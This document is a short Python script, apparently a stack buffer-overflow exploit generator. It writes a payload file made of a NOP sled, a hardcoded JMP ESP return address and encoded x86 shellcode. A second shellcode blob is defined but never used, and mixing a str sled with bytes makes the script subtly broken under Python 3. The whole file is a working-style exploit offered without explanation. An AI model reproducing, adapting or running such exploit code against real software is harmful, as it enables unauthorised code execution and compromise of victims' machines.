import struct

file = open("payload.txt","w+")

pattern_create_length = 3000
offset = 256

buf = b""
buf += b"\xdb\xc2\xbd\x72\x07\xda\xa7\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x31\x83\xe8\xfc\x31\x68\x14\x03\x68\x66\xe5"
buf += b"\x2f\x5b\x6e\x6b\xcf\xa4\x6e\x0c\x59\x41\x5f\x0c\x3d"
buf += b"\x01\xcf\xbc\x35\x47\xe3\x37\x1b\x7c\x70\x35\xb4\x73"
buf += b"\x31\xf0\xe2\xba\xc2\xa9\xd7\xdd\x40\xb0\x0b\x3e\x79"
buf += b"\x7b\x5e\x3f\xbe\x66\x93\x6d\x17\xec\x06\x82\x1c\xb8"
buf += b"\x9a\x29\x6e\x2c\x9b\xce\x26\x4f\x8a\x40\x3d\x16\x0c"
buf += b"\x62\x92\x22\x05\x7c\xf7\x0f\xdf\xf7\xc3\xe4\xde\xd1"
buf += b"\x1a\x04\x4c\x1c\x93\xf7\x8c\x58\x13\xe8\xfa\x90\x60"
buf += b"\x95\xfc\x66\x1b\x41\x88\x7c\xbb\x02\x2a\x59\x3a\xc6"
buf += b"\xad\x2a\x30\xa3\xba\x75\x54\x32\x6e\x0e\x60\xbf\x91"
buf += b"\xc1\xe1\xfb\xb5\xc5\xaa\x58\xd7\x5c\x16\x0e\xe8\xbf"
buf += b"\xf9\xef\x4c\xcb\x17\xfb\xfc\x96\x7d\xfa\x73\xad\x33"
buf += b"\xfc\x8b\xae\x63\x95\xba\x25\xec\xe2\x42\xec\x49\x1c"
buf += b"\x09\xad\xfb\xb5\xd4\x27\xbe\xdb\xe6\x9d\xfc\xe5\x64"
buf += b"\x14\x7c\x12\x74\x5d\x79\x5e\x32\x8d\xf3\xcf\xd7\xb1"
buf += b"\xa0\xf0\xfd\xd1\x27\x63\x9d\x3b\xc2\x03\x04\x44"

shellcode =  b""
shellcode += b"\x43\xfc\x92\x41\x40\x98\x92\xf5\xd6\x99\xfc"
shellcode += b"\xfc\x40\x9f\xfc\x91\x90\x91\x98\x91\x48\x4a"
shellcode += b"\xf5\x92\x41\x37\xf8\x42\x49\x9f\xb8\x6e\xe1"
shellcode += b"\xf8\xbe\xdd\xc6\xd9\x74\x24\xf4\x5f\x31\xc9"
shellcode += b"\xb1\x52\x83\xc7\x04\x31\x47\x0e\x03\x29\xef"
shellcode += b"\x1a\x4b\x49\x07\x58\xb4\xb1\xd8\x3d\x3c\x54"
shellcode += b"\xe9\x7d\x5a\x1d\x5a\x4e\x28\x73\x57\x25\x7c"
shellcode += b"\x67\xec\x4b\xa9\x88\x45\xe1\x8f\xa7\x56\x5a"
shellcode += b"\xf3\xa6\xd4\xa1\x20\x08\xe4\x69\x35\x49\x21"
shellcode += b"\x97\xb4\x1b\xfa\xd3\x6b\x8b\x8f\xae\xb7\x20"
shellcode += b"\xc3\x3f\xb0\xd5\x94\x3e\x91\x48\xae\x18\x31"
shellcode += b"\x6b\x63\x11\x78\x73\x60\x1c\x32\x08\x52\xea"
shellcode += b"\xc5\xd8\xaa\x13\x69\x25\x03\xe6\x73\x62\xa4"
shellcode += b"\x19\x06\x9a\xd6\xa4\x11\x59\xa4\x72\x97\x79"
shellcode += b"\x0e\xf0\x0f\xa5\xae\xd5\xd6\x2e\xbc\x92\x9d"
shellcode += b"\x68\xa1\x25\x71\x03\xdd\xae\x74\xc3\x57\xf4"
shellcode += b"\x52\xc7\x3c\xae\xfb\x5e\x99\x01\x03\x80\x42"
shellcode += b"\xfd\xa1\xcb\x6f\xea\xdb\x96\xe7\xdf\xd1\x28"
shellcode += b"\xf8\x77\x61\x5b\xca\xd8\xd9\xf3\x66\x90\xc7"
shellcode += b"\x04\x88\x8b\xb0\x9a\x77\x34\xc1\xb3\xb3\x60"
shellcode += b"\x91\xab\x12\x09\x7a\x2b\x9a\xdc\x2d\x7b\x34"
shellcode += b"\x8f\x8d\x2b\xf4\x7f\x66\x21\xfb\xa0\x96\x4a"
shellcode += b"\xd1\xc8\x3d\xb1\xb2\x36\x69\x2a\xc8\xdf\x68"
shellcode += b"\x4c\xdc\x43\xe4\xaa\xb4\x6b\xa0\x65\x21\x15"
shellcode += b"\xe9\xfd\xd0\xda\x27\x78\xd2\x51\xc4\x7d\x9d"
shellcode += b"\x91\xa1\x6d\x4a\x52\xfc\xcf\xdd\x6d\x2a\x67"
shellcode += b"\x81\xfc\xb1\x77\xcc\x1c\x6e\x20\x99\xd3\x67"
shellcode += b"\xa4\x37\x4d\xde\xda\xc5\x0b\x19\x5e\x12\xe8"
shellcode += b"\xa4\x5f\xd7\x54\x83\x4f\x21\x54\x8f\x3b\xfd"
shellcode += b"\x03\x59\x95\xbb\xfd\x2b\x4f\x12\x51\xe2\x07"
shellcode += b"\xe3\x99\x35\x51\xec\xf7\xc3\xbd\x5d\xae\x95"
shellcode += b"\xc2\x52\x26\x12\xbb\x8e\xd6\xdd\x16\x0b\xe6"
shellcode += b"\x97\x3a\x3a\x6f\x7e\xaf\x7e\xf2\x81\x1a\xbc"
shellcode += b"\x0b\x02\xae\x3d\xe8\x1a\xdb\x38\xb4\x9c\x30"
shellcode += b"\x31\xa5\x48\x36\xe6\xc6\x58"

payload = "\x90"*offset
payload += struct.pack("<I",0x76FD80F6) #JMP ESP 0x76FD80F6
payload += buf
payload += b"\x90"*100

file.write(payload)
file.close()

